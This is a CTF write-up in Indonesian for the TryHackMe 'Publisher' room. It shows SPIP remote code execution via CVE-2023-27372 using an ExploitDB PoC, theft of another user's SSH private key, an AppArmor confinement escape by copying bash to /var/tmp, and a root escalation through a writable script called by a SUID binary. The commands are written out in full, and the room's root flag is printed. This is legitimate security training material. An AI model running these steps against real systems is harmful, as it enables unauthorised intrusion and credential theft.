# Publisher — TryHackMe Writeup

**Target:** Publisher  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web, CVE, Lateral Movement, AppArmor Bypass, Privilege Escalation  

---

## Recon

Target menggunakan **SPIP v4.2.0** yang terdeteksi dari header/footer halaman web.

---

## Vulnerability Research

```
CVE-2023-27372
Remote Code Execution — SPIP < 4.2.1
```

Root cause: endpoint reset password (`spip.php?page=spip_pass`) tidak melakukan sanitasi input dengan benar. Parameter `oubli` yang seharusnya menerima email sebagai plain text, ternyata memproses input sebagai serialized object — memungkinkan attacker menyisipkan serialized payload yang dieksekusi oleh sistem.

---

## Eksploitasi — RCE via CVE-2023-27372

### Exploit Flow

1. GET request ke reset page untuk mengambil token valid
2. POST ulang dengan token tersebut
3. Isi parameter `oubli` bukan dengan email, tapi dengan serialized string berisi command
4. Server memproses serialized string dan mengeksekusi command

### Eksekusi

Menggunakan PoC dari ExploitDB:

```bash
python3 51536.py -u http://TARGET/spip -c id
python3 51536.py -u http://TARGET/spip -c ls -la
python3 51536.py -u http://TARGET/spip -c cat /home/think/user.txt
```

Hasil command dapat dilihat di source code HTML response. Shell diperoleh sebagai user **www-data**.

### User Flag

```
THM{user_flag}
```

---

## Lateral Movement — www-data → think

Dari shell sebagai www-data, ditemukan SSH private key milik user think:

```bash
cat /home/think/.ssh/id_rsa
```

Login SSH menggunakan key tersebut:

```bash
ssh -i id_rsa think@TARGET
```

Shell diperoleh sebagai user **think**.

---

## Privilege Escalation — AppArmor Bypass + SUID Script

### Enumerasi SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binary yang mencurigakan:

```
/usr/sbin/run_container
```

### Analisis Binary

```bash
strings /usr/sbin/run_container
```

Output menunjukkan binary memanggil:

```
/opt/run_container.sh
```

### Cek Permission Script

```bash
ls -la /opt/run_container.sh
# -rwxrwxrwx 1 root root /opt/run_container.sh
```

Secara filesystem permission terlihat writable oleh semua user. Namun saat dicoba modifikasi langsung, gagal — bukan karena permission, melainkan karena **AppArmor** memblokir write ke `/opt` di level yang lebih dalam dari filesystem.

### AppArmor Analysis

```bash
cat /etc/apparmor.d/usr.sbin.ash
```

Profile AppArmor menunjukkan `/opt` dalam deny list. Namun beberapa direktori seperti `/var/tmp` berada dalam **complain mode** — write diizinkan.

### Bypass AppArmor Confinement

Copy bash ke direktori yang tidak diblokir AppArmor:

```bash
cp /bin/bash /var/tmp/bash
/var/tmp/bash -p
```

User tetap **think**, bukan root. Yang berubah adalah AppArmor confinement — shell baru berjalan di luar profile yang sebelumnya membatasi akses, sehingga modifikasi `/opt/run_container.sh` kini bisa dilakukan.

### Inject Payload

Edit `/opt/run_container.sh` dan tambahkan:

```bash
cat /root/root.txt
```

Jalankan binary SUID:

```bash
/usr/sbin/run_container
```

Karena binary berjalan sebagai root via SUID, command yang ditambahkan dieksekusi dengan privilege root.

### Root Flag

```
3a4225cc9e85709adda6ef55d6a4f2ca
```

---

## Dead End

Setelah menemukan `run_container` SUID dan `run_container.sh` yang terlihat writable, privesc dibantu GPT. GPT menyarankan dua teknik yang keduanya gagal:

Pertama, membuat binary palsu `validate_container_id` untuk mengeksploitasi error `validate_container_id: command not found`. Kedua, PATH hijack terhadap `docker` yang dipanggil tanpa path absolut di dalam script.

Keduanya gagal karena binary SUID menjalankan script dalam environment yang dibatasi **AppArmor** — manipulasi PATH tidak bekerja selama shell masih dalam AppArmor confinement.

AppArmor sebagai root cause baru ditemukan setelah melihat writeup.

---

## Ringkasan

| Fase             | Teknik                                              |
|------------------|-----------------------------------------------------|
| Recon            | Version detection — SPIP v4.2.0                     |
| Vulnerability    | CVE-2023-27372 — PHP object injection via oubli     |
| Initial Access   | RCE → shell sebagai www-data                        |
| Lateral Movement | SSH private key → shell sebagai think               |
| Enum PrivEsc     | SUID binary → memanggil writable shell script       |
| AppArmor Bypass  | cp bash ke /var/tmp → keluar dari confinement       |
| PrivEsc          | Edit script → eksekusi via SUID binary sebagai root |
| Flag             | user + root ✅                                      |

## Takeaway

Tiga poin penting dari room ini. Pertama, filesystem permission dan AppArmor adalah dua layer berbeda — file yang terlihat writable di `ls -la` belum tentu bisa dimodifikasi kalau AppArmor memblokir di level prosesnya. Kedua, AppArmor bypass bukan privilege escalation — user tetap sama, yang berubah hanya confinement yang membatasi akses. Ketiga, SUID binary yang memanggil script eksternal adalah vector privesc yang powerful — setelah confinement dibypass, inject command ke script tersebut akan dieksekusi sebagai root.

